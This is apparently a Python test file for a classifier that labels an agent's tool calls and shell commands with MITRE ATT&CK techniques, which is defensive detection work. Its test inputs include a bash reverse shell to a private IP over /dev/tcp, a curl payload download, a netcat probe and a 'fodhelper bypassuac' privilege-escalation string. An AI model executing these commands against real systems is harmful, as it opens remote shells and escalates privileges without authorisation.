from backend import attack

def _c(tool, args, cmd=None):
    a = attack.classify(tool, args, cmd, None)
    return a["label"] if a else None

def test_nmap_is_active_scanning():
    assert _c("kali_nmap", {"target": "10.0.0.1", "top_ports": 100}) == "Reconnaissance: Active Scanning"

def test_nc_probe_is_active_scanning():
    assert _c("sandbox_bash", {"command": "echo | nc 10.0.0.1 80 | head -c 100"},
              "echo | nc 10.0.0.1 80 | head -c 100") == "Reconnaissance: Active Scanning"

def test_whatweb_is_vuln_scanning():
    assert _c("kali_whatweb", {"host": "example.com"}) == "Reconnaissance: Active Scanning: Vulnerability Scanning"

def test_gobuster_is_wordlist_scanning():
    assert _c("kali_gobuster", {"url": "http://x/"}) == "Reconnaissance: Active Scanning: Wordlist Scanning"

def test_dig_is_network_info():
    assert _c("net_dig", {"name": "example.com"}) == "Reconnaissance: Gather Victim Network Information: DNS"

def test_reverse_shell_is_execution():
    assert _c("sandbox_bash", {"command": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"},
              "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1") == "Execution: Command and Scripting Interpreter: Unix Shell"

def test_download_is_ingress_tool_transfer():
    assert _c("sandbox_bash", {"command": "curl -s -o /tmp/f https://x/f"},
              "curl -s -o /tmp/f https://x/f") == "Command and Control: Ingress Tool Transfer"

def test_hibp_is_identity_recon():
    assert _c("sandbox_bash", {"command": "curl https://haveibeenpwned.com/api/v3/breachedaccount/a@b.c"},
              "curl haveibeenpwned breachedaccount") == "Reconnaissance: Gather Victim Identity Information: Email Addresses"

def test_uac_bypass_is_privesc_subtechnique():
    a = attack.classify("sandbox_bash", {"command": "fodhelper bypassuac"}, "fodhelper bypassuac", None)
    assert a["label"] == "Privilege Escalation: Bypass User Account Control" and a["technique_id"] == "T1548.002"

def test_benign_grep_is_uncategorized():
    assert _c("sandbox_bash", {"command": "grep -n foo bar.txt"}, "grep -n foo bar.txt") is None
